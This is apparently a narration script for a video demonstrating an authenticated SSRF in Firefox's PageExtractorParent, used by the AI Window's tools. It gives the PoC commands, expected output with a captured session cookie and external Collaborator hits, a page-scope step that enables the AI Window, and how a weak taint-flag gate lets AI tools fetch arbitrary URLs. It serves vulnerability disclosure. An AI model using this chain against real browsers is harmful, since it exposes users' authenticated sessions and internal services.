# Video PoC script — 01 Authenticated SSRF (PageExtractorParent)

Replace `COLLAB_URL` with your Burp Collaborator URL before running.
Replace `FF_BIN` with the path to your extracted Firefox 153.0.1.

## 0. What to say on camera first

> Stock Firefox 153.0.1, clean profile. `getHeadlessExtractor` only checks the host when
> `anonymousFetch` is set, so the default path fetches anything — from the parent process, with the
> user's cookies, and hands the body back.

Show the version so it is on tape:

```bash
/path/to/firefox-153.0.1/firefox --version
```

Expected: `Mozilla Firefox 153.0.1`

## 1. Show the bug in the source (5 seconds on screen)

```bash
sed -n '140,165p' toolkit/components/pageextractor/PageExtractorParent.sys.mjs
```

Highlight the line `if (anonymousFetch && url.protocol === "http:") {` — the host check is *inside*
that branch.

```bash
sed -n '918,930p' browser/components/aiwindow/models/Tools.sys.mjs
```

Highlight the `&&` joining `untrustedInput` and `privateData`.

## 2. Start the listener

Terminal 1:

```bash
cd 01-AUTHENTICATED-SSRF
python3 listener.py
```

Expected on screen:

```
listener on 0.0.0.0:8999 — every request printed, cookies in RED
```

Leave this visible for the whole recording — this is where the proof lands.

## 3. Run the PoC

Terminal 2:

```bash
cd 01-AUTHENTICATED-SSRF
# edit the two placeholders at the top of poc.py first:
#   FF_BIN     = "/path/to/firefox-153.0.1/firefox"
#   COLLAB_URL = "YOUR_BURP_COLLABORATOR_URL_HERE"
python3 poc.py
```

Firefox launches on `about:welcome`. The script primes the cookie jar, then walks the matrix.

## 4. What to show on screen, in order

1. **Terminal 2** — the matrix table as it prints:

```
  A loopback, default path               ALLOWED:...
  D loopback + anonymousFetch            ALLOWED:...
  E file: scheme (control)               REFUSED:Only http: and https: URLs are supported.
  B external http, default               ALLOWED:...
  C external http + anon (control)       REFUSED:Only https: URLs are supported for anonymous fetches.
```

Call out rows **C** and **E**: those are the controls. They prove the validation exists and works —
it is simply not wired to the default path.

2. **Terminal 1** — the captured request. This is the money shot:

```
======================================================================
GET /SSRF-AUTHED-nonanon HTTP/1.1
  Host: 127.0.0.1:8999
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
  Cookie: sessionid=VICTIM_SESSION_abc123   <-- CREDENTIALS ATTACHED
======================================================================
```

Point at the red `Cookie:` line. Then point at the `/SSRF-AUTHED-anon` request immediately below it,
which has **no** Cookie header — same function, same run, only difference is `anonymousFetch`.

3. **Terminal 2 verdict**:

```
CONFIRMED — parent fetched an internal URL WITH the profile cookie:
    /SSRF-AUTHED-nonanon   Cookie: sessionid=VICTIM_SESSION_abc123
  control: anonymousFetch path cookie = None (expected None)
```

4. **Burp Collaborator panel** — show the two external hits:
   - `GET /SSRF-external-http`
   - `GET /FIREFOX-PARENT-SSRF-unrestricted`

   Highlight the `User-Agent: … Firefox/153.0` and `Sec-Fetch-Site` on the Collaborator request —
   it is Firefox itself making the call, not the page.

## 5. The page-scope half (enable chain)

Show that the AI Window can be turned on from page scope, since that is the precondition:

```bash
python3 -m http.server 8080 --directory .
```

Then in the Firefox launched by the PoC, open `about:welcome`, open devtools console and paste
`full_chain_pageextractor_ssrf.js`.

Expected console output:

```
Step 1: checking page scope for privileged exports...
  found 23: AWAddScreenImpression, ..., AWSendToParent, ..., RPMGetFormatURLPref
Step 2: enabling AI Window via ungated SET_PREF route...
  set browser.smartwindow.enabled = true
  set browser.smartwindow.isDefaultWindow = true
  set browser.smartwindow.firstrun.hasCompleted = true
```

Then close Firefox and show the independent oracle — the browser's own prefs file:

```bash
grep smartwindow /tmp/ffpoc-*/prefs.js
```

## 6. Closing line for the recording

> The host check exists and fires — rows C and E prove it. It just isn't applied on the path the
> tools actually use, and the gate above it needs *both* taint flags when five of the seven tools
> only ever set one.

## Honest caveats to state on camera

- This needs script inside `about:welcome`; no web-content path into that page was found and none is
  claimed.
- The LLM step that would choose the URL in a real attack is not demonstrated here.
- `-remote-allow-system-access` is used by `poc.py` purely as a verification oracle to reach the
  parent module directly. It is not part of the attack path.
